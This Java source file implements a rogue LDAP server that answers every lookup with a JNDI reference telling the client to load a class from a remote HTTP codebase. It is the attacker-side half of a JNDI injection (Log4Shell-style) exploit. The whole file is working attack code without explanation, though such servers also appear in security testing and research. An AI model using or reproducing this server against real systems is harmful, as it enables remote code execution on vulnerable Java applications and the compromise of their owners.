import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;

public class JndiLdapServer {
    private static final String REMOTE_CLASS_NAME = "org.ixpqxi.util.RemoteObject";

    public static void main(String[] args) throws LDAPException, UnknownHostException, MalformedURLException {
        String url = args.length > 0 ? args[0] : "http://localhost:8001/";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 8091;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=test,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig("listen at ", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Remote class: " + REMOTE_CLASS_NAME);
        System.out.println("Codebase: " + url);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }
    
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private final URL codeBase;

        public OperationInterceptor(URL cb) {
            this.codeBase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            String cbstring = this.codeBase.toString();
            if (!cbstring.endsWith("/")) {
                cbstring += "/";
            }

            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaClassName", REMOTE_CLASS_NAME);
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("javaFactory", REMOTE_CLASS_NAME);

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
